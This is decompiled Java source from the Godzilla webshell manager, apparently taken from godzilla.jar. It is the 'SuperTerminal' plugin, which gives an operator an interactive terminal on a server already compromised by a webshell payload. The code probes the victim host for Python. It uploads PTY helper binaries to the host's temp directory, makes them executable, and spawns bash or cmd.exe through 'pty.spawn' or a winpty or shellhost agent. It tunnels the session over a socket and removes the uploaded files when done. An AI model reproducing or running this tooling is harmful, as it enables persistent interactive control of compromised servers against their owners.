/*     */ package shells.plugins.generic;
/*     */ import com.jediterm.terminal.Questioner;
/*     */ import com.jediterm.terminal.TtyConnector;
/*     */ import com.jediterm.terminal.ui.JediTermWidget;
/*     */ import com.jediterm.terminal.ui.settings.SettingsProvider;
/*     */ import core.Encoding;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.dialog.AppSeting;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.BufferedReader;
/*     */ import java.io.BufferedWriter;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.File;
/*     */ import java.io.IOException;
/*     */ import java.io.InputStreamReader;
/*     */ import java.io.OutputStream;
/*     */ import java.io.OutputStreamWriter;
/*     */ import java.net.InetSocketAddress;
/*     */ import java.net.Socket;
/*     */ import java.util.Arrays;
/*     */ import java.util.UUID;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import shells.plugins.generic.seting.SuperTerminalSeting;
/*     */ import shells.plugins.generic.seting.TerminalSettingsProvider;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ 
/*     */ public abstract class SuperTerminal implements Plugin {
/*  42 */   public static final String[] WINDOWS_PTY_COMMANDS = new String[] { "winShellhost cmd.exe", "winpty cmd.exe" };
/*  43 */   public static final String[] LINUX_PTY_COMMANDS = new String[] { "linpty bash" };
/*     */   
/*  45 */   private final String DLL_NAME_FORMAT = "winpty_x%d.dll";
/*  46 */   private final String AGENT_EXE = "winpty-agent.exe";
/*  47 */   private final String SHELLHOST_EXE = "shellhost-agent.exe";
/*     */   
/*  49 */   private final String[] PYTHON_NAMES = new String[] { "python", "python3", "python2" }; private String[] tempFileName;
/*     */   private JPanel panel;
/*     */   private JediTermWidget terminal;
/*     */   private JButton StartButton;
/*     */   
/*     */   static {
/*  55 */     AppSeting.registerPluginSeting("超级终端", SuperTerminalSeting.class);
/*     */   }
/*     */ 
/*     */   
/*     */   private JButton StopButton;
/*     */   
/*     */   private JLabel pollingSleepLabel;
/*     */   
/*     */   private JLabel execFileLabel;
/*     */   
/*     */   private JComboBox execFileTextField;
/*     */   
/*     */   private JTextField pollingSleepTextField;
/*     */   
/*     */   private JSplitPane realSplitPane;
/*     */   private boolean ptyInited;
/*     */   protected ShellEntity shellEntity;
/*     */   protected Payload payload;
/*     */   protected Encoding encoding;
/*     */   private boolean isRuning;
/*     */   private ByteArrayOutputStream bufferByteArrayOutputStream;
/*     */   private Integer sleepTime;
/*     */   private RealCmd realCmd;
/*     */   protected String realCmdCommand;
/*     */   
/*     */   public SuperTerminal() {
/*  81 */     this.panel = new JPanel(new BorderLayout());
/*  82 */     this.pollingSleepLabel = new JLabel("polling Sleep(ms)");
/*  83 */     this.execFileLabel = new JLabel("exec command");
/*  84 */     this.StartButton = new JButton("Start");
/*  85 */     this.StopButton = new JButton("Stop");
/*  86 */     this.terminal = new JediTermWidget((SettingsProvider)new TerminalSettingsProvider());
/*  87 */     this.pollingSleepTextField = new JTextField("1000", 7);
/*  88 */     this.execFileTextField = new JComboBox<>(new String[0]);
/*  89 */     this.realSplitPane = new JSplitPane();
/*     */ 
/*     */ 
/*     */     
/*  93 */     this.realSplitPane.setOrientation(0);
/*  94 */     this.realSplitPane.setDividerSize(0);
/*  95 */     this.execFileTextField.setEditable(true);
/*     */     
/*  97 */     JPanel realTopPanel = new JPanel();
/*  98 */     realTopPanel.add(this.pollingSleepLabel);
/*  99 */     realTopPanel.add(this.pollingSleepTextField);
/* 100 */     realTopPanel.add(this.execFileLabel);
/* 101 */     realTopPanel.add(this.execFileTextField);
/* 102 */     realTopPanel.add(this.StartButton);
/* 103 */     realTopPanel.add(this.StopButton);
/*     */     
/* 105 */     this.realSplitPane.setTopComponent(realTopPanel);
/* 106 */     this.realSplitPane.setBottomComponent(new JScrollPane((Component)this.terminal));
/*     */ 
/*     */     
/* 109 */     this.sleepTime = new Integer(this.pollingSleepTextField.getText());
/* 110 */     this.terminal.getTerminal().writeCharacters("The next generation of webshell powerful Godzilla");
/* 111 */     this.terminal.getTerminal().nextLine();
/*     */ 
/*     */     
/* 114 */     this.panel.add(this.realSplitPane);
/*     */   }
/*     */   
/*     */   protected synchronized void StartButtonClick(ActionEvent actionEvent) throws IOException {
/* 118 */     load();
/* 119 */     String tmpCommand = this.execFileTextField.getSelectedItem().toString().trim();
/* 120 */     String[] commandArray = functions.SplitArgs(tmpCommand);
/*     */ 
/*     */ 
/*     */     
/* 124 */     if (Arrays.<String>stream(WINDOWS_PTY_COMMANDS).anyMatch(cmd -> cmd.startsWith(commandArray[0])) || Arrays.<String>stream(LINUX_PTY_COMMANDS).anyMatch(cmd -> cmd.startsWith(commandArray[0]))) {
/* 125 */       if (!loadPty(tmpCommand)) {
/* 126 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "初始化Pty失败!!!");
/*     */         return;
/*     */       } 
/*     */     } else {
/* 130 */       this.realCmdCommand = tmpCommand;
/*     */     } 
/*     */     
/* 133 */     if (this.realCmdCommand == null) {
/* 134 */       this.realCmdCommand = tmpCommand;
/*     */     }
/*     */     
/* 137 */     InetSocketAddress socketAddress = this.realCmd.startRealCmd(0, "127.0.0.1", this.realCmdCommand, Integer.valueOf(500));
/*     */     try {
/* 139 */       if (socketAddress != null) {
/* 140 */         Socket socket = new Socket();
/* 141 */         socket.connect(socketAddress, 2000);
/* 142 */         this.terminal.setTtyConnector(new LoggingPtyProcessTtyConnector(socket));
/* 143 */         this.terminal.start();
/*     */       } else {
/* 145 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未能创建RealCmd服务");
/*     */       } 
/* 147 */     } catch (Exception e) {
/* 148 */       this.terminal.stop();
/* 149 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   protected void StopButtonClick(ActionEvent actionEvent) {
/* 155 */     this.terminal.stop();
/* 156 */     this.realCmd.StopButtonClick(null);
/* 157 */     if (this.tempFileName != null) {
/* 158 */       Arrays.<String>stream(this.tempFileName).forEach(fileName -> this.payload.deleteFile(fileName));
/*     */     }
/* 160 */     this.tempFileName = null;
/*     */   }
/*     */   
/*     */   protected void load() {
/* 164 */     if (this.realCmd == null) {
/* 165 */       this.realCmd = getRealCmd();
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 171 */     this.shellEntity = shellEntity;
/* 172 */     this.payload = this.shellEntity.getPayloadModule();
/* 173 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 174 */     automaticBindClick.bindJButtonClick(SuperTerminal.class, this, SuperTerminal.class, this);
/*     */     
/* 176 */     this.execFileTextField.removeAllItems();
/* 177 */     if (this.payload.isWindows()) {
/* 178 */       Arrays.<String>stream(WINDOWS_PTY_COMMANDS).forEach(cmd -> this.execFileTextField.addItem(cmd));
/*     */     } else {
/* 180 */       Arrays.<String>stream(LINUX_PTY_COMMANDS).forEach(cmd -> this.execFileTextField.addItem(cmd));
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 188 */     return this.panel;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private synchronized boolean loadPty(String command) {
/* 195 */     if (!this.ptyInited) {
/*     */       try {
/* 197 */         if (command.startsWith("winpty")) {
/* 198 */           if (winptyInit(command)) {
/* 199 */             this.ptyInited = true;
/*     */           }
/* 201 */         } else if (command.startsWith("linpty")) {
/* 202 */           if (linptyInit(command)) {
/* 203 */             this.ptyInited = true;
/*     */           }
/* 205 */         } else if (command.startsWith("winShellhost") && 
/* 206 */           winshellhostInit(command)) {
/* 207 */           this.ptyInited = true;
/*     */         }
/*     */       
/* 210 */       } catch (Exception e) {
/* 211 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
/* 212 */         Log.error(e);
/*     */       } 
/*     */     }
/* 215 */     return this.ptyInited;
/*     */   }
/*     */ 
/*     */   
/*     */   protected String getTempDirectory() {
/* 220 */     return this.payload.getTempDirectory();
/*     */   }
/*     */   
/*     */   public boolean linptyInit(String tmpCommand) {
/* 224 */     String pythonName = null;
/* 225 */     for (int i = 0; i < this.PYTHON_NAMES.length; i++) {
/*     */       try {
/* 227 */         Log.log("正在查找%s解释器", new Object[] { this.PYTHON_NAMES[i] });
/* 228 */         String result = this.payload.execCommand(String.format("%s -c 'print(701111+6368)'", new Object[] { this.PYTHON_NAMES[i] }));
/* 229 */         if (result != null && result.indexOf("707479") != -1) {
/* 230 */           pythonName = this.PYTHON_NAMES[i];
/*     */           break;
/*     */         } 
/* 233 */       } catch (Exception e) {
/* 234 */         Log.error(e);
/*     */       } 
/*     */     } 
/* 237 */     if (pythonName == null) {
/* 238 */       String fileName = getTempDirectory() + "pty-" + UUID.randomUUID().toString().replace("-", "");
/* 239 */       Log.log("未找到Python解释器 正在上传linuxPty  RemoteFile->%s", new Object[] { fileName });
/* 240 */       if (this.payload.uploadFile(fileName, functions.readInputStreamAutoClose(SuperTerminal.class.getResourceAsStream("assets/linuxpty")))) {
/* 241 */         this.payload.execCommand(String.format("chmod +x %s", new Object[] { fileName }));
/* 242 */         String[] commands = functions.SplitArgs(tmpCommand);
/* 243 */         this.realCmdCommand = String.format("%s \"%s\"", new Object[] { fileName, commands[1] });
/* 244 */         this.tempFileName = new String[] { fileName };
/* 245 */         Log.log("LinuxPty 派生命令->%s", new Object[] { this.realCmdCommand });
/* 246 */         return true;
/*     */       } 
/*     */     } else {
/*     */       
/* 250 */       String[] commands = functions.SplitArgs(tmpCommand);
/* 251 */       this.realCmdCommand = String.format("python -c 'import pty; pty.spawn(\"%s\")'\n", new Object[] { commands[1] });
/* 252 */       Log.log("已找到Python解释器 解释器名->%s 派生命令->%s", new Object[] { pythonName, this.realCmdCommand });
/* 253 */       return true;
/*     */     } 
/* 255 */     return false;
/*     */   }
/*     */   
/*     */   public boolean winptyInit(String tmpCommand) throws Exception {
/* 259 */     String dllName = "winpty_x%d.dll";
/* 260 */     dllName = String.format(dllName, new Object[] { Integer.valueOf(this.payload.isX64() ? 64 : 32) });
/*     */     
/* 262 */     File dllFile = new File(SuperTerminal.class.getResource("assets/" + dllName).toURI());
/* 263 */     File exeFile = new File(SuperTerminal.class.getResource("assets/winpty-agent.exe").toURI());
/*     */     
/* 265 */     String fullDLLPath = getTempDirectory() + dllName;
/* 266 */     String fullEXEPath = getTempDirectory() + "winpty-agent.exe";
/*     */     
/* 268 */     if (this.payload.getFileSize(fullDLLPath) <= 0) {
/* 269 */       if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullDLLPath, dllFile)) {
/* 270 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "上传Winpty插件失败", "错误", 0);
/* 271 */         return false;
/*     */       } 
/*     */     } else {
/* 274 */       Log.log("已有winpty dll 无需再次上传", new Object[0]);
/*     */     } 
/*     */     
/* 277 */     if (this.payload.getFileSize(fullEXEPath) <= 0) {
/* 278 */       if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullEXEPath, exeFile)) {
/* 279 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "上传Winpty agent失败", "错误", 0);
/* 280 */         return false;
/*     */       } 
/*     */     } else {
/* 283 */       Log.log("已有winpty agent 无需再次上传", new Object[0]);
/*     */     } 
/* 285 */     this.tempFileName = new String[] { fullEXEPath, fullDLLPath };
/* 286 */     this.realCmdCommand = tmpCommand;
/* 287 */     return true;
/*     */   }
/*     */   public boolean winshellhostInit(String tmpCommand) throws Exception {
/* 290 */     File exeFile = new File(SuperTerminal.class.getResource("assets/shellhost-agent.exe").toURI());
/* 291 */     String fullEXEPath = getTempDirectory() + "shellhost-agent.exe";
/*     */     
/* 293 */     if (this.payload.getFileSize(fullEXEPath) <= 0) {
/* 294 */       if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(fullEXEPath, exeFile)) {
/* 295 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "上传shellhost agent失败", "错误", 0);
/* 296 */         return false;
/*     */       } 
/*     */     } else {
/* 299 */       Log.log("已有shellhost agent 无需再次上传", new Object[0]);
/*     */     } 
/* 301 */     String executeFile = functions.SplitArgs(tmpCommand)[1];
/* 302 */     this.realCmdCommand = fullEXEPath + " ---pty " + executeFile;
/* 303 */     this.tempFileName = new String[] { fullEXEPath };
/* 304 */     return true;
/*     */   }
/*     */   
/*     */   public abstract RealCmd getRealCmd();
/*     */   
/* 309 */   public static class LoggingPtyProcessTtyConnector implements TtyConnector { private BufferedReader bufferedReader = null; private Socket socket;
/* 310 */     private BufferedWriter bufferedWriter = null;
/* 311 */     private OutputStream outputStream = null;
/*     */     
/*     */     public LoggingPtyProcessTtyConnector(Socket socket) {
/* 314 */       this.socket = socket;
/*     */       try {
/* 316 */         this.bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
/* 317 */         this.outputStream = socket.getOutputStream();
/* 318 */         this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(this.outputStream));
/* 319 */       } catch (IOException e) {
/* 320 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*     */ 
/*     */     
/*     */     public boolean init(Questioner q) {
/* 326 */       return this.socket.isConnected();
/*     */     }
/*     */ 
/*     */ 
/*     */     
/*     */     public void close() {
/*     */       try {
/* 333 */         this.socket.close();
/* 334 */       } catch (IOException e) {
/* 335 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*     */ 
/*     */     
/*     */     public String getName() {
/* 341 */       return toString();
/*     */     }
/*     */ 
/*     */     
/*     */     public int read(char[] buf, int offset, int length) throws IOException {
/* 346 */       int len = this.bufferedReader.read(buf, offset, length);
/* 347 */       return len;
/*     */     }
/*     */ 
/*     */     
/*     */     public void write(String string) throws IOException {
/* 352 */       this.bufferedWriter.write(string);
/* 353 */       this.bufferedWriter.flush();
/*     */     }
/*     */ 
/*     */     
/*     */     public int waitFor() throws InterruptedException {
/* 358 */       return 0;
/*     */     }
/*     */ 
/*     */     
/*     */     public void write(byte[] bytes) throws IOException {
/* 363 */       this.outputStream.write(bytes);
/* 364 */       this.outputStream.flush();
/*     */     }
/*     */ 
/*     */ 
/*     */     
/*     */     public boolean isConnected() {
/* 370 */       return this.socket.isConnected();
/*     */     } }
/*     */ 
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\SuperTerminal.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */